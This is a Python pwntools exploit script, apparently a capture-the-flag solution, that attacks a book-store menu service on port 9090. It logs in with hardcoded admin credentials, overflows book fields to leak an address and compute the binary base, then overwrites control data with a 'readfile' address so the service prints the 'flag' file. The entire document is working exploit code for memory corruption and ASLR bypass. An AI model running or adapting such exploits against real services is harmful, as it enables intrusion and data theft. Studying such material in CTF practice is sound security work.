from pwn import *
import time

#r = remote("192.168.151.61", 9090)
r = remote("0", 9090)

def login():
	r.recv()
	r.sendline("helloadmin")	# id
	time.sleep(0.1)
	r.recv()
	r.sendline("iulover!@#$")	# pw
	time.sleep(0.1)
	print "login"

def makebook():
	r.recv()
	r.sendline("1")	# menu
	time.sleep(0.1)
	r.recv()
	r.sendline("name")	# name
	time.sleep(0.1)
	r.recv()
	r.sendline("description")	# description
	time.sleep(0.1)
	r.recv()
	r.sendline("0")	# book
	time.sleep(0.1)
	print "make book"

def modify_info(i):
	r.recv()
	r.sendline("2")	# menu
	time.sleep(0.1)
	r.recv()
	r.sendline(str(i))	# index
	time.sleep(0.1)
	r.recv()
	r.sendline("3")	# modify information
	time.sleep(0.1)
	r.recv()
	r.sendline("1094795585")	# stoke = 0x41414141
	time.sleep(0.1)
	r.recv()
	r.sendline("1094795585")	# price = 0x41414141
	time.sleep(0.1)
	r.recv()
	r.sendline("1")	# free shipping = 1
	time.sleep(0.1)
	r.recv()
	r.sendline("1")	# available = 1
	time.sleep(0.1)
	r.recv()
	r.sendline("A"*0x14)	# name = A * 0x14
	time.sleep(0.1)
	r.recv()
	r.sendline("B"*0x14)	# description = B * 0x14
	time.sleep(0.1)
	r.recv()
	r.sendline("0")	# back to main
	time.sleep(0.1)
	print "modify info"


def leak():
	r.recv()
	r.sendline("4")
	time.sleep(0.1)

	data = ""
	data += "A" * 0x14
	data += "A" * 8
	r.recvuntil(data)
	return u32(r.recv(4))


def modify_eip(i, base):
	readfile = base + 0x8DB
	r.recv()
        r.sendline("2") # menu
        time.sleep(0.1)
        r.recv()
        r.sendline(str(i))      # index
        time.sleep(0.1)
        r.recv()
	r.sendline("2")	# modify description
	time.sleep(0.1)
	r.recv()
	data = ""
	data += "A"*0xA70
	data += p32(readfile)
	data += "A"*0x50
	r.send(data)	# des
	time.sleep(0.1)
	r.recv()
        r.sendline("3") # modify information
        time.sleep(0.1)
        r.recv()
        r.sendline("1094795585")        # stoke = 0x41414141
        time.sleep(0.1)
        r.recv()
        r.sendline("1094795585")        # price = 0x41414141
        time.sleep(0.1)
        r.recv()
        r.sendline("0") # free shipping = 0
        time.sleep(0.1)
        r.recv()
        r.sendline("1") # available = 1
        time.sleep(0.1)
        r.recv()
        r.sendline("flag"+"\x00")	# name = flag
        time.sleep(0.1)
        r.recv()
        r.sendline("B"*0x14)    # description = B * 0x14
        time.sleep(0.1)
        r.recv()
	r.sendline("4")	#modify Shipping Info
	time.sleep(0.1)
	r.recv()
	r.sendline("1")	#set to free shipping
	time.sleep(0.1)
	r.recv()
        r.sendline("0") # back to main
        time.sleep(0.1)
        print "modify eip"

def exploit():
	r.recv()
	r.sendline("3")	# menu
	time.sleep(0.1)
	r.recv()
	r.sendline("0")	#index
	print "Exploit"
	print r.recv()

login()
makebook()
modify_info(0)
func = leak()
print "leaked address : " + hex(func)
base = func - 0x9AD
print "Base Addr : " + hex(base)
modify_eip(0,base)
exploit()
